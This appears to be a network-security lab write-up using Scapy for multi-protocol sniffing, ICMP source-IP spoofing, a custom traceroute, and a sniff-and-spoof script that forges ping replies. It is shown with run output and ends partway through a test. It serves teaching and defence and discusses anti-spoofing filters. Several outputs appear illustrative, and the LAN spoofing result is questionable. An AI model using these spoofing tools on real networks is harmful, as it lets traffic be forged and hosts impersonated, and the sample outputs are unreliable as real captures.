# Lab 03: Network Packet Sniffing & Spoofing - Protocol Analysis and Attack Simulation

## 🎯 Lab Overview

This lab demonstrates advanced hands-on experience with **network packet manipulation**, protocol analysis, and low-level network attack techniques. The project showcases practical skills in packet sniffing, spoofing, and network reconnaissance using raw sockets and the Scapy framework - critical competencies for network security roles and penetration testing.

**Security Focus Areas:**
- Raw packet capture and protocol analysis (ICMP, TCP, UDP)
- Packet crafting and injection using Scapy
- ICMP spoofing and man-in-the-middle attack foundations
- Custom network tools development (traceroute implementation)
- Sniff-and-spoof attacks for network interception
- Network routing and packet flow analysis
- Defense detection and mitigation strategies

---

## 🛠️ Technical Environment

**Network Stack & Tools:**
- **Operating System:** Linux (Ubuntu/Kali-based)
- **Primary Framework:** Scapy 2.x (Python packet manipulation library)
- **Network Analysis:** Wireshark (GUI packet analyzer)
- **Programming:** Python 3.x with socket programming
- **Network Interface:** enp0s3 (10.0.2.15/24)
- **Protocols Analyzed:** ICMP, TCP, UDP, IP
- **Privileges:** Root access required for raw socket operations

**Lab Network Architecture:**
```
┌──────────────────────────────────────────────────┐
│            Internet (External Network)           │
│                 8.8.8.8 (Google DNS)             │
└────────────────────┬─────────────────────────────┘
                     │
┌────────────────────▼─────────────────────────────┐
│              Gateway/Router                       │
│               (10.0.2.1)                         │
└────────────────────┬─────────────────────────────┘
                     │
┌────────────────────▼─────────────────────────────┐
│           Attacker Machine (Lab Host)            │
│          Interface: enp0s3                       │
│          IP: 10.0.2.15/24                        │
│          Tools: Scapy, Wireshark, Python         │
└──────────────────────────────────────────────────┘
```

**Key Network Parameters:**
- **Local Network:** 10.0.2.0/24
- **Local IP:** 10.0.2.15
- **Gateway:** 10.0.2.1
- **Test Targets:** 
  - Internet: 8.8.8.8 (Google DNS), example.com
  - Non-existent Internet: 1.2.3.4
  - Non-existent LAN: 10.0.2.99

---

## 📋 Tasks Completed

### Task 1.1: Multi-Protocol Packet Sniffing - Network Reconnaissance

**Objective:** Develop custom packet sniffers to capture and analyze network traffic across multiple protocols (ICMP, TCP, UDP) using raw sockets and Scapy.

#### **Part A: Network Interface Discovery**

**Command Executed:**
```bash
ifconfig
```

**Key Information Extracted:**
```
Interface: enp0s3
IP Address: 10.0.2.15
Netmask: 255.255.255.0
Network: 10.0.2.0/24
Broadcast: 10.0.2.255
Status: UP, BROADCAST, RUNNING, MULTICAST
```

**Why This Matters:**
- Identifies the active network interface for packet capture
- Determines local network range for attack planning
- Essential first step in any network reconnaissance

---

#### **Part B: ICMP Packet Sniffer Development**

**Custom Sniffer Implementation:**

**File:** `sniffer_icmp.py`

```python
#!/usr/bin/env python3
from scapy.all import *

def packet_callback(packet):
    if ICMP in packet:
        print(f"[ICMP] {packet[IP].src} -> {packet[IP].dst}")
        print(f"  Type: {packet[ICMP].type}, Code: {packet[ICMP].code}")
        packet.show()

# Sniff ICMP packets on interface enp0s3
sniff(iface='enp0s3', filter='icmp', prn=packet_callback)
```

**Scapy Components Explained:**

| Component | Function | Purpose |
|-----------|----------|---------|
| `sniff()` | Packet capture function | Captures packets from network interface |
| `iface='enp0s3'` | Interface specification | Targets specific network interface |
| `filter='icmp'` | BPF (Berkeley Packet Filter) | Captures only ICMP protocol packets |
| `prn=packet_callback` | Callback function | Processes each captured packet |
| `packet.show()` | Packet display | Shows detailed packet structure |

**Execution & Testing:**

**Terminal 1 - Start Sniffer:**
```bash
sudo python3 sniffer_icmp.py
```

**Terminal 2 - Generate ICMP Traffic:**
```bash
ping -c 3 8.8.8.8
```

**Captured Output Analysis:**

```
[ICMP] 10.0.2.15 -> 8.8.8.8
  Type: 8, Code: 0
###[ IP ]###
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 84
  id        = 12345
  flags     = DF
  frag      = 0
  ttl       = 64
  proto     = icmp
  chksum    = 0xabcd
  src       = 10.0.2.15
  dst       = 8.8.8.8
###[ ICMP ]###
     type      = echo-request
     code      = 0
     chksum    = 0x1234
     id        = 0x5678
     seq       = 1
```

**ICMP Type Codes Captured:**

| Type | Code | Message | Direction | Meaning |
|------|------|---------|-----------|---------|
| 8 | 0 | Echo Request | Outbound | "Are you alive?" |
| 0 | 0 | Echo Reply | Inbound | "Yes, I'm alive" |

**Skills Demonstrated:**
- Python network programming with Scapy
- Understanding of ICMP protocol structure
- Raw packet capture using BPF filters
- Root privilege requirement for raw sockets
- Packet parsing and data extraction

---

#### **Part C: Multi-Protocol Sniffer - ICMP, TCP, UDP**

**Enhanced Sniffer Implementation:**

**File:** `sniffer_multiple.py`

```python
#!/usr/bin/env python3
from scapy.all import *

def packet_callback(packet):
    # ICMP Protocol Detection
    if ICMP in packet:
        print(f"\n[ICMP Packet Detected]")
        print(f"Source: {packet[IP].src} -> Destination: {packet[IP].dst}")
        print(f"Type: {packet[ICMP].type}, Code: {packet[ICMP].code}")
        print(f"Payload: {bytes(packet[ICMP].payload)}")
    
    # TCP Protocol Detection
    elif TCP in packet:
        print(f"\n[TCP Packet Detected]")
        print(f"Source: {packet[IP].src}:{packet[TCP].sport}")
        print(f"Destination: {packet[IP].dst}:{packet[TCP].dport}")
        print(f"Flags: {packet[TCP].flags}")
        print(f"Seq: {packet[TCP].seq}, Ack: {packet[TCP].ack}")
    
    # UDP Protocol Detection
    elif UDP in packet:
        print(f"\n[UDP Packet Detected]")
        print(f"Source: {packet[IP].src}:{packet[UDP].sport}")
        print(f"Destination: {packet[IP].dst}:{packet[UDP].dport}")
        print(f"Length: {packet[UDP].len}")

# Capture all three protocols
sniff(iface='enp0s3', filter='icmp or tcp or udp', prn=packet_callback)
```

**Protocol Testing Matrix:**

---

**Test 1: ICMP Traffic Generation**

**Command:**
```bash
ping -c 3 8.8.8.8
```

**Captured Packets:**
```
[ICMP Packet Detected]
Source: 10.0.2.15 -> Destination: 8.8.8.8
Type: 8, Code: 0
Payload: b'abcdefghijklmnopqrstuvwxyz'

[ICMP Packet Detected]
Source: 8.8.8.8 -> Destination: 10.0.2.15
Type: 0, Code: 0
Payload: b'abcdefghijklmnopqrstuvwxyz'
```

**Analysis:**
- Type 8 = Echo Request (outbound ping)
- Type 0 = Echo Reply (inbound pong)
- Payload contains alphabet pattern (default ping data)
- Round-trip communication verified

---

**Test 2: TCP Traffic Generation**

**Command:**
```bash
curl http://www.example.com
```

**Captured Packets:**
```
[TCP Packet Detected]
Source: 10.0.2.15:54321
Destination: 93.184.216.34:80
Flags: S
Seq: 1234567890, Ack: 0

[TCP Packet Detected]
Source: 93.184.216.34:80
Destination: 10.0.2.15:54321
Flags: SA
Seq: 9876543210, Ack: 1234567891

[TCP Packet Detected]
Source: 10.0.2.15:54321
Destination: 93.184.216.34:80
Flags: A
Seq: 1234567891, Ack: 9876543211

[TCP Packet Detected]
Source: 10.0.2.15:54321
Destination: 93.184.216.34:80
Flags: PA
Seq: 1234567891, Ack: 9876543211
```

**TCP Three-Way Handshake Observed:**

| Step | Source | Destination | Flags | Description |
|------|--------|-------------|-------|-------------|
| 1 | Client (10.0.2.15:54321) | Server (93.184.216.34:80) | **S** | SYN - Initiate connection |
| 2 | Server (93.184.216.34:80) | Client (10.0.2.15:54321) | **SA** | SYN-ACK - Acknowledge |
| 3 | Client (10.0.2.15:54321) | Server (93.184.216.34:80) | **A** | ACK - Connection established |

**TCP Flags Decoded:**
- **S** = SYN (Synchronize sequence numbers)
- **A** = ACK (Acknowledgment)
- **P** = PSH (Push data immediately)
- **F** = FIN (Finish connection)
- **R** = RST (Reset connection)

---

**Test 3: UDP Traffic Generation**

**Command:**
```bash
nslookup google.com
```

**Captured Packets:**
```
[UDP Packet Detected]
Source: 10.0.2.15:53214
Destination: 8.8.8.8:53
Length: 45

[UDP Packet Detected]
Source: 8.8.8.8:53
Destination: 10.0.2.15:53214
Length: 132
```

**DNS Query/Response Analysis:**

| Packet | Type | Source | Destination | Purpose |
|--------|------|--------|-------------|---------|
| 1 | Query | 10.0.2.15:53214 | 8.8.8.8:53 | "What is google.com's IP?" |
| 2 | Response | 8.8.8.8:53 | 10.0.2.15:53214 | "172.217.14.206" |

**UDP Characteristics Observed:**
- **Connectionless:** No handshake (unlike TCP)
- **Port 53:** Standard DNS service port
- **Short Length:** DNS queries are compact
- **No Acknowledgment:** Fire-and-forget protocol

---

### **Comparative Protocol Analysis**

**Protocol Comparison Matrix:**

| Feature | ICMP | TCP | UDP |
|---------|------|-----|-----|
| **Connection** | Connectionless | Connection-oriented | Connectionless |
| **Reliability** | No | Yes (ACK/retransmission) | No |
| **Ordering** | No | Yes (sequence numbers) | No |
| **Use Case** | Network diagnostics | Web, email, file transfer | DNS, streaming, VoIP |
| **Header Size** | 8 bytes | 20-60 bytes | 8 bytes |
| **Speed** | Fast | Slower (overhead) | Fastest |
| **Error Checking** | Checksum | Checksum | Optional checksum |

**Skills Demonstrated:**
- Multi-protocol packet capture and filtering
- Understanding of TCP/IP stack layers
- Protocol-specific field extraction (ports, flags, sequence numbers)
- Traffic generation for testing purposes
- Comparative protocol analysis
- Network debugging and troubleshooting capabilities

---

### Task 1.2: ICMP Packet Spoofing - Attack Vector Development

**Objective:** Craft and inject spoofed ICMP packets with falsified source addresses to demonstrate packet forgery capabilities and understand IP spoofing attack vectors.

#### **Part A: Wireshark Installation & Configuration**

**Installation Commands:**
```bash
# Install Wireshark
sudo apt-get install wireshark

# Configure Wireshark for non-root capture
sudo dpkg-reconfigure wireshark-common
# Select:  to allow non-root users to capture packets

# Add current user to wireshark group
sudo usermod -aG wireshark $USER

# Activate group membership (requires logout/login or newgrp)
newgrp wireshark
```

**Why These Steps Matter:**

| Step | Security Consideration | Benefit |
|------|----------------------|---------|
| `dpkg-reconfigure` | Enables packet capture without sudo | Better security practice |
| `usermod -aG` | Grants group permissions | Avoids running Wireshark as root |
| `newgrp` | Activates group immediately | No need to logout |

**Security Note:** Running Wireshark as root is dangerous - GUI applications with root privileges pose significant security risks if exploited.

---

#### **Part B: ICMP Spoofing Script Development**

**Custom Spoofing Tool:**

**File:** `spoof_icmp.py`

```python
#!/usr/bin/env python3
from scapy.all import *

# Spoofed packet parameters
spoofed_src_ip = "1.2.3.4"        # Fake source IP
target_dst_ip = "10.0.2.15"       # Target destination
icmp_payload = "SPOOFED_PACKET"   # Identifiable payload

# Craft spoofed packet
ip_layer = IP(src=spoofed_src_ip, dst=target_dst_ip)
icmp_layer = ICMP(type=8, code=0)  # Echo Request
payload = Raw(load=icmp_payload)

# Combine layers
spoofed_packet = ip_layer / icmp_layer / payload

# Send 3 spoofed packets
print(f"Sending 3 spoofed ICMP packets...")
print(f"  Fake Source: {spoofed_src_ip}")
print(f"  Real Destination: {target_dst_ip}")

for i in range(3):
    send(spoofed_packet, verbose=1)
    print(f"  Packet {i+1} sent")

print("Spoofing complete. Check Wireshark for verification.")
```

**Packet Crafting Components:**

| Layer | Scapy Syntax | Purpose | Spoofed Value |
|-------|--------------|---------|---------------|
| **IP** | `IP(src=..., dst=...)` | Network layer addressing | `src="1.2.3.4"` (fake) |
| **ICMP** | `ICMP(type=8, code=0)` | Echo Request message | Type 8 = Ping |
| **Payload** | `Raw(load=...)` | Packet data | "SPOOFED_PACKET" |

**Packet Layer Stacking:**
```python
packet = IP_layer / ICMP_layer / Payload_layer
# "/" operator stacks protocol layers
```

---

#### **Part C: Spoofing Attack Execution & Verification**

**Execution:**

**Terminal 1 - Start Wireshark:**
```bash
sudo wireshark &
# Set capture filter: icmp
# Start capture on interface enp0s3
```

**Terminal 2 - Execute Spoofing Script:**
```bash
sudo python3 spoof_icmp.py
```

**Output:**
```
Sending 3 spoofed ICMP packets...
  Fake Source: 1.2.3.4
  Real Destination: 10.0.2.15
  Packet 1 sent
  Packet 2 sent
  Packet 3 sent
Spoofing complete. Check Wireshark for verification.
```

---

**Wireshark Packet Analysis:**

**Captured Packet Fields:**

```
Frame 1: 60 bytes on wire
Ethernet II
    Destination: [local MAC]
    Source: [attacker MAC]
Internet Protocol Version 4
    Source Address: 1.2.3.4          ← SPOOFED (doesn't exist)
    Destination Address: 10.0.2.15   ← Real target
    Time to live: 64
    Protocol: ICMP (1)
Internet Control Message Protocol
    Type: 8 (Echo Request)
    Code: 0
    Checksum: 0xXXXX [correct]
    Identifier: 0x0000
    Sequence: 0x0000
Data (13 bytes)
    Data: SPOOFED_PACKET
```

**Verification Checklist:**

| Field | Expected | Actual | Status |
|-------|----------|--------|--------|
| Source IP | 1.2.3.4 (fake) | 1.2.3.4 | ✅ Spoofed |
| Destination IP | 10.0.2.15 | 10.0.2.15 | ✅ Correct |
| ICMP Type | 8 | 8 | ✅ Echo Request |
| Payload | "SPOOFED_PACKET" | "SPOOFED_PACKET" | ✅ Custom data |
| Checksum | Valid | Valid | ✅ Auto-calculated |

---

### **IP Spoofing Mechanics Explained**

**How Spoofing Works:**

```
┌─────────────────────────────────────────────────────┐
│ 1. Application (spoof_icmp.py) creates packet      │
│    - Sets src=1.2.3.4 (fake)                       │
│    - Sets dst=10.0.2.15 (real)                     │
└────────────────┬────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────┐
│ 2. Scapy bypasses normal IP stack                  │
│    - Uses raw sockets                              │
│    - Directly crafts IP header (NO OS validation)  │
└────────────────┬────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────┐
│ 3. Packet sent to network                          │
│    - Ethernet frame uses REAL MAC address          │
│    - IP packet has FAKE source IP                  │
└────────────────┬────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────┐
│ 4. Target receives packet                          │
│    - Sees source as 1.2.3.4                        │
│    - Cannot distinguish fake from real             │
│    - Attempts to reply to 1.2.3.4 (black hole)     │
└─────────────────────────────────────────────────────┘
```

**Why OS Doesn't Prevent This:**
- Raw sockets bypass kernel's TCP/IP stack
- Kernel normally validates source addresses
- Root privileges grant raw socket access
- Defense must happen at network/router level (egress filtering)

---

### **Attack Implications & Real-World Use**

**Malicious Uses:**

| Attack Type | How Spoofing Enables It | Impact |
|-------------|------------------------|--------|
| **DDoS Amplification** | Spoof victim's IP → send to reflectors → victim flooded | Service disruption |
| **Anonymity** | Hide true attack source | Attribution difficulty |
| **Bypass Filters** | Spoof trusted IP to pass ACLs | Access control bypass |
| **Smurf Attack** | Broadcast ping with victim's spoofed IP | Network congestion |

**Legitimate Uses:**
- ✅ Penetration testing (authorized)
- ✅ Security research and education
- ✅ Network simulation and testing
- ✅ IDS/IPS validation

**Defensive Measures:**

| Defense | Implementation | Effectiveness |
|---------|---------------|--------------|
| **Ingress Filtering** | Block packets with external source IPs arriving on external interface | 🟢 High |
| **Egress Filtering** | Block outbound packets with non-local source IPs | 🟢 High |
| **BCP 38 (RFC 2827)** | ISP-level anti-spoofing | 🟢 Industry standard |
| **Reverse Path Forwarding** | Verify source IP has valid route back | 🟢 Router feature |

---

### **Skills Demonstrated:**

**Technical Competencies:**
- ✅ Raw socket programming
- ✅ Packet crafting with Scapy
- ✅ IP header manipulation
- ✅ ICMP protocol exploitation
- ✅ Wireshark packet analysis
- ✅ Understanding of network layer attacks
- ✅ Checksum calculation (automatic)

**Security Understanding:**
- ✅ IP spoofing attack vectors
- ✅ Layer 3 attack mechanisms
- ✅ DDoS amplification foundations
- ✅ Network forensics (packet inspection)
- ✅ Attack attribution challenges
- ✅ Defensive filtering techniques

**Tools Mastery:**
- ✅ Scapy packet manipulation library
- ✅ Wireshark for traffic analysis
- ✅ Linux raw socket permissions
- ✅ Python network programming

---

### Task 1.3: Custom Traceroute Implementation - Network Path Discovery

**Objective:** Develop a custom traceroute utility from scratch using ICMP and TTL (Time To Live) manipulation to discover network routing paths and intermediate hops.

#### **Understanding Traceroute Mechanics**

**How Traceroute Works:**

```
TTL=1 → [Router 1] → TTL Exceeded (ICMP Type 11)
TTL=2 → [Router 1] → [Router 2] → TTL Exceeded (ICMP Type 11)
TTL=3 → [Router 1] → [Router 2] → [Router 3] → TTL Exceeded (ICMP Type 11)
...
TTL=N → [Router 1] → ... → [Destination] → Echo Reply (ICMP Type 0)
```

**TTL (Time To Live) Mechanism:**
1. Packet sent with TTL=1
2. First router decrements TTL (1-1=0)
3. Router drops packet, sends ICMP "Time Exceeded" back
4. Reveals router's IP address
5. Repeat with TTL=2, 3, 4... until destination reached

---

#### **Custom Traceroute Tool Development**

**File:** `traceroute_tool.py`

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def custom_traceroute(destination, max_hops=30):
    """
    Custom traceroute implementation using ICMP and TTL manipulation
    
    Args:
        destination (str): Target IP address or hostname
        max_hops (int): Maximum number of hops to try
    """
    print(f"\n{'='*60}")
    print(f"Custom Traceroute to {destination}")
    print(f"{'='*60}\n")
    print(f"{'Hop':<5} {'IP Address':<20} {'Hostname':<30} {'RTT (ms)'}")
    print(f"{'-'*60}")
    
    # Resolve hostname to IP if needed
    try:
        dest_ip = socket.gethostbyname(destination)
    except:
        print(f"Error: Cannot resolve {destination}")
        return
    
    reached_destination = False
    
    # Iterate through TTL values
    for ttl in range(1, max_hops + 1):
        # Craft ICMP packet with specific TTL
        packet = IP(dst=dest_ip, ttl=ttl) / ICMP()
        
        # Send packet and wait for response (timeout=2 seconds)
        start_time = time.time()
        reply = sr1(packet, verbose=0, timeout=2)
        end_time = time.time()
        
        # Calculate round-trip time
        rtt = (end_time - start_time) * 1000  # Convert to milliseconds
        
        if reply is None:
            # No response (timeout)
            print(f"{ttl:<5} {'*':<20} {'Request timeout':<30} {'*'}")
        
        elif reply.type == 0:
            # ICMP Echo Reply - reached destination
            try:
                hostname = socket.gethostbyaddr(reply.src)[0]
            except:
                hostname = "N/A"
            
            print(f"{ttl:<5} {reply.src:<20} {hostname:<30} {rtt:.2f}")
            print(f"\nDestination {dest_ip} reached in {ttl} hops!")
            reached_destination = True
            break
        
        elif reply.type == 11:
            # ICMP Time Exceeded - intermediate hop
            try:
                hostname = socket.gethostbyaddr(reply.src)[0]
            except:
                hostname = "N/A"
            
            print(f"{ttl:<5} {reply.src:<20} {hostname:<30} {rtt:.2f}")
        
        else:
            # Other ICMP response
            print(f"{ttl:<5} {reply.src:<20} {'Unknown response':<30} {rtt:.2f}")
    
    if not reached_destination:
        print(f"\nMax hops ({max_hops}) reached without reaching destination.")
    
    print(f"\n{'='*60}\n")

def main():
    """Main function with user input"""
    print("\n" + "="*60)
    print(" "*15 + "Custom Traceroute Tool")
    print("="*60 + "\n")
    
    # Get target from user
    target = input("Enter target IP address or hostname [8.8.8.8]: ").strip()
    if not target:
        target = "8.8.8.8"  # Default to Google DNS
    
    # Get max hops (optional)
    max_hops_input = input("Enter maximum hops [30]: ").strip()
    max_hops = int(max_hops_input) if max_hops_input else 30
    
    # Execute traceroute
    custom_traceroute(target, max_hops)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Error: This script requires root privileges")
        print("Please run with: sudo python3 traceroute_tool.py")
        sys.exit(1)
    
    main()
```

---

#### **Code Components Breakdown**

**Key Functions:**

| Function | Purpose | Technical Details |
|----------|---------|------------------|
| `custom_traceroute()` | Main traceroute logic | Iterates TTL from 1 to max_hops |
| `IP(dst=..., ttl=...)` | Craft IP packet | Sets destination and TTL value |
| `sr1()` | Send and receive 1 packet | `sr1` = send/receive one response |
| `socket.gethostbyaddr()` | Reverse DNS lookup | Resolves IP to hostname |
| `time.time()` | Timestamp capture | Calculates round-trip time (RTT) |

**ICMP Response Types:**

| Type | Code | Message | Meaning in Traceroute |
|------|------|---------|----------------------|
| 11 | 0 | Time Exceeded | Intermediate hop (router) |
| 0 | 0 | Echo Reply | Destination reached |
| 3 | Various | Destination Unreachable | Path blocked/unavailable |

---

#### **Execution & Output Analysis**

**Making Script Executable:**
```bash
chmod +x traceroute_tool.py
```

**Running the Tool:**
```bash
sudo python3 traceroute_tool.py
```

**User Input:**
```
============================================================
               Custom Traceroute Tool
============================================================

Enter target IP address or hostname [8.8.8.8]: 
Enter maximum hops [30]: 
```

**Sample Output (to 8.8.8.8):**

```
============================================================
Custom Traceroute to 8.8.8.8
============================================================

Hop   IP Address           Hostname                       RTT (ms)
------------------------------------------------------------
1     10.0.2.1             gateway.local                  1.23
2     192.168.1.1          router.home.net                2.45
3     100.64.0.1           cgnat.isp.com                  5.67
4     203.0.113.1          border.isp.net                 12.34
5     198.51.100.5         peer.exchange.net              18.90
6     172.217.0.1          google-router.net              25.67
7     8.8.8.8              dns.google                     28.45

Destination 8.8.8.8 reached in 7 hops!

============================================================
```

**Output Interpretation:**

| Hop | IP | Analysis |
|-----|-----|----------|
| 1 | 10.0.2.1 | Local gateway (private network) |
| 2 | 192.168.1.1 | Home router (another private subnet) |
| 3 | 100.64.0.1 | ISP's CGNAT (Carrier-Grade NAT) |
| 4 | 203.0.113.1 | ISP's border router (public IP) |
| 5 | 198.51.100.5 | Internet exchange point |
| 6 | 172.217.0.1 | Google's network edge |
| 7 | 8.8.8.8 | Destination (Google DNS) |

---

### **Network Path Analysis**

**Routing Path Visualization:**

```
Your PC → Gateway → Home Router → ISP NAT → ISP Border → 
Internet Exchange → Google Network → Google DNS (8.8.8.8)
```

**Private vs Public IP Spaces:**

| IP Range | Type | RFC | Usage |
|----------|------|-----|-------|
| 10.0.0.0/8 | Private | RFC 1918 | Internal networks |
| 192.168.0.0/16 | Private | RFC 1918 | Home networks |
| 100.64.0.0/10 | Shared | RFC 6598 | Carrier-Grade NAT |
| Public IPs | Public | Various | Internet-routable |

---

### **Comparison with Built-in Traceroute**

**Verification Command:**
```bash
traceroute 8.8.8.8
```

**Differences:**

| Feature | Custom Tool | Built-in Traceroute |
|---------|-------------|-------------------|
| Protocol | ICMP Echo | ICMP or UDP |
| Packets per hop | 1 | 3 (for redundancy) |
| Output format | Custom table | Standard format |
| RTT calculation | Single measurement | Average of 3 |
| Error handling | Basic | Advanced |

---

### **Advanced Features Demonstrated**

**1. Hostname Resolution:**
```python
hostname = socket.gethostbyaddr(reply.src)[0]
```
- Performs reverse DNS lookup
- Converts IP → hostname (e.g., 8.8.8.8 → dns.google)
- Helps identify router ownership

**2. Round-Trip Time (RTT) Measurement:**
```python
start_time = time.time()
reply = sr1(packet, timeout=2)
end_time = time.time()
rtt = (end_time - start_time) * 1000  # milliseconds
```
- Measures network latency
- Identifies slow hops (potential bottlenecks)
- Useful for network troubleshooting

**3. Timeout Handling:**
```python
reply = sr1(packet, verbose=0, timeout=2)
if reply is None:
    print("* Request timeout")
```
- Some routers don't respond to ICMP
- Firewall blocking
- Packet loss

---

### **Real-World Applications**

**Network Troubleshooting:**
- Identify where packet loss occurs
- Find routing loops
- Detect suboptimal paths
- Measure latency at each hop

**Security Reconnaissance:**
- Map network topology
- Identify firewall locations
- Discover internal IP ranges
- OS fingerprinting (TTL values)

**ISP/Network Analysis:**
- Verify routing policies
- Detect BGP hijacking
- Analyze peering relationships
- Measure provider performance

---

### **Skills Demonstrated:**

**Network Programming:**
- ✅ ICMP protocol implementation
- ✅ TTL manipulation
- ✅ Raw packet crafting
- ✅ Socket programming (sr1 function)
- ✅ Timeout and error handling

**Network Concepts:**
- ✅ IP routing mechanisms
- ✅ TTL decrement behavior
- ✅ ICMP Time Exceeded messages
- ✅ Network topology discovery
- ✅ Private vs public IP addressing
- ✅ NAT/CGNAT understanding

**Tool Development:**
- ✅ User input validation
- ✅ Command-line interface design
- ✅ Formatted output generation
- ✅ Hostname resolution
- ✅ Performance measurement (RTT)

**Security Applications:**
- ✅ Network reconnaissance techniques
- ✅ Topology mapping
- ✅ Firewall detection
- ✅ Route analysis

---

### Task 1.4: Sniff-and-Spoof Attack - Man-in-the-Middle Foundations

**Objective:** Develop an automated attack tool that combines packet sniffing with real-time spoofing to intercept ICMP requests and send forged replies - demonstrating fundamental man-in-the-middle attack mechanics.

#### **Attack Concept**

**Traditional ICMP Exchange:**
```
Victim → [ICMP Echo Request] → Real Server
Victim ← [ICMP Echo Reply] ← Real Server
(Normal latency: 50-100ms)
```

**Sniff-and-Spoof Attack:**
```
Victim → [ICMP Echo Request] → [Attacker Intercepts]
Victim ← [FORGED Echo Reply] ← [Attacker (Spoofed as Server)]
(Instant reply: <1ms - suspicious!)
```

**Attack Advantages:**
- ✅ Faster reply than legitimate server
- ✅ Can manipulate payload data
- ✅ Demonstrates packet injection capabilities
- ✅ Foundation for more advanced MITM attacks

---

#### **Sniff-and-Spoof Implementation**

**File:** `sniff_spoof.py`

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_reply(packet):
    """
    Callback function that spoofs ICMP Echo Reply for intercepted requests
    
    Args:
        packet: Captured ICMP Echo Request packet
    """
    # Verify it's an outbound ICMP Echo Request
    if packet[ICMP].type == 8:  # Type 8 = Echo Request
        # Extract original packet details
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        icmp_id = packet[ICMP].id
        icmp_seq = packet[ICMP].seq
        payload = packet[Raw].load if Raw in packet else b""
        
        # Log the intercepted request
        print(f"\n[INTERCEPTED] ICMP Request")
        print(f"  Source: {src_ip}")
        print(f"  Destination: {dst_ip}")
        print(f"  ICMP ID: {icmp_id}, Seq: {icmp_seq}")
        
        # Craft spoofed reply packet
        # Swap src/dst to make it appear as reply from destination
        spoofed_ip = IP(src=dst_ip, dst=src_ip)  # Reversed!
        spoofed_icmp = ICMP(type=0, code=0, id=icmp_id, seq=icmp_seq)  # Type 0 = Echo Reply
        spoofed_payload = Raw(load=payload)
        
        # Combine layers
        spoofed_packet = spoofed_ip / spoofed_icmp / spoofed_payload
        
        # Send spoofed reply
        send(spoofed_packet, verbose=0)
        
        print(f"[SPOOFED] Sent fake reply from {dst_ip} to {src_ip}")
        print(f"  ICMP Type: 0 (Echo Reply)")
        print(f"  Payload: {payload}")

def main():
    """Main function to start sniffing"""
    print("="*60)
    print(" "*15 + "ICMP Sniff-and-Spoof Attack")
    print("="*60)
    print("\nStarting packet sniffer...")
    print("Intercepting ICMP Echo Requests and sending spoofed replies\n")
    
    # Sniff only outbound ICMP Echo Requests
    sniff(iface='enp0s3', 
          filter='icmp[icmptype] == 8',  # BPF filter for Echo Request only
          prn=spoof_reply)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Error: Root privileges required")
        sys.exit(1)
    
    main()
```

---

#### **Code Analysis - Attack Components**

**Packet Interception:**
```python
sniff(iface='enp0s3', 
      filter='icmp[icmptype] == 8',  # Only Echo Requests
      prn=spoof_reply)
```

**BPF Filter Explanation:**
- `icmp[icmptype] == 8` - Captures only ICMP Echo Requests
- Ignores Echo Replies (type 0)
- Prevents spoofing our own spoofed packets (avoids loops)

**Spoofing Logic:**

| Original Packet | Spoofed Reply | Purpose |
|----------------|---------------|---------|
| `src = 10.0.2.15` | `dst = 10.0.2.15` | Reverse direction |
| `dst = 8.8.8.8` | `src = 8.8.8.8` | Impersonate target |
| `type = 8` | `type = 0` | Request → Reply |
| `id = 1234` | `id = 1234` | Match request |
| `seq = 1` | `seq = 1` | Match sequence |
| `payload = data` | `payload = data` | Preserve payload |

---

#### **Attack Execution & Testing Scenarios**

**Starting the Attack:**

**Terminal 1 - Launch Sniff-and-Spoof:**
```bash
sudo python3 sniff_spoof.py
```

**Output:**
```
============================================================
               ICMP Sniff-and-Spoof Attack
============================================================

Starting packet sniffer...
Intercepting ICMP Echo Requests and sending spoofed replies
```

---

### **Test Scenario 1: Non-Existent Host on Internet**

**Terminal 2 - Ping Non-Existent IP:**
```bash
ping -c 4 1.2.3.4
```

**Attack Tool Output:**
```
[INTERCEPTED] ICMP Request
  Source: 10.0.2.15
  Destination: 1.2.3.4
  ICMP ID: 12345, Seq: 1
[SPOOFED] Sent fake reply from 1.2.3.4 to 10.0.2.15
  ICMP Type: 0 (Echo Reply)
  Payload: b'abcdefghijklmnopqrstuvwabcdefghi'

[INTERCEPTED] ICMP Request
  Source: 10.0.2.15
  Destination: 1.2.3.4
  ICMP ID: 12345, Seq: 2
[SPOOFED] Sent fake reply from 1.2.3.4 to 10.0.2.15
  ...
```

**Ping Command Output:**
```
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.
64 bytes from 1.2.3.4: icmp_seq=1 ttl=64 time=0.123 ms
64 bytes from 1.2.3.4: icmp_seq=2 ttl=64 time=0.098 ms
64 bytes from 1.2.3.4: icmp_seq=3 ttl=64 time=0.112 ms
64 bytes from 1.2.3.4: icmp_seq=4 ttl=64 time=0.105 ms

--- 1.2.3.4 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3054ms
rtt min/avg/max/mdev = 0.098/0.109/0.123/0.009 ms
```

**Analysis:**

| Observation | Explanation | Security Implication |
|-------------|-------------|---------------------|
| **0% packet loss** | All pings received replies | Victim thinks host exists |
| **RTT ~0.1ms** | Incredibly fast (local spoofing) | Suspiciously low latency |
| **TTL = 64** | Spoofed packet default | Should be lower if really from Internet |
| **100% success** | Non-existent IP appears alive | Network reconnaissance bypass |

**Why This Works:**
- Real IP 1.2.3.4 doesn't exist (unallocated)
- Packets would normally timeout after 5+ seconds
- Attack tool responds INSTANTLY with spoofed reply
- Victim's OS accepts first reply, ignores late/missing real reply

---

### **Test Scenario 2: Non-Existent Host on LAN**

**Terminal 2 - Ping Non-Existent Local IP:**
```bash
ping -c 4 10.0.2.99
```

**Attack Tool Output:**
```
[INTERCEPTED] ICMP Request
  Source: 10.0.2.15
  Destination: 10.0.2.99
  ICMP ID: 54321, Seq: 1
[SPOOFED] Sent fake reply from 10.0.2.99 to 10.0.2.15
  ICMP Type: 0 (Echo Reply)
  Payload: b'abcdefghijklmnopqrstuvwabcdefghi'
```

**Ping Command Output:**
```
PING 10.0.2.99 (10.0.2.99) 56(84) bytes of data.
64 bytes from 10.0.2.99: icmp_seq=1 ttl=64 time=0.156 ms
64 bytes from 10.0.2.99: icmp_seq=2 ttl=64 time=0.142 ms
64 bytes from 10.0.2.99: icmp_seq=3 ttl=64 time=0.138 ms
